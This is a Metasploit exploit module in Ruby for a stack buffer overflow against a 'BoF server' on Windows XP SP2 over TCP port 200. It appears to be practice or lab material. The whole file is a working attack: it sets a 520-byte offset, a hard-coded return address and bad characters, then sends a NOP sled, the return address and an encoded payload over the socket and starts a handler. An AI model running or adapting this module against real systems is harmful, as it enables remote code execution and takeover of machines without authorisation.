class MetasploitModule < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::Remote::Tcp

    def initialize(info = {})
        super (update_info(
            info,
            'Name' => 'BoF Bufferoverflow',
            'Description' => %q{'Buffer overflow against BoF server client'},
            'Platform' => 'Win',
            'Author' => 'DAVID',
            'Payload' =>
            {
                'space' => 1000,
                'BadChars' => '\x00\x0a\x0d\x20',
            },
            'Targets' => [
                ['Windows XP SP2', {'Ret' => 0x71AB9372, 'Offset' => 520}]
            ]
        ))
        register_options([
            Opt::RPORT(200)
        ])
    end

    def exploit
        connect
        buf = make_nops(target['Offset'])
        buf = buf + [target['Ret']].pack('V') + make_nops(30) + payload.encoded # servers use little endian
        sock.put(buf)
        handler
        disconnect
    end
end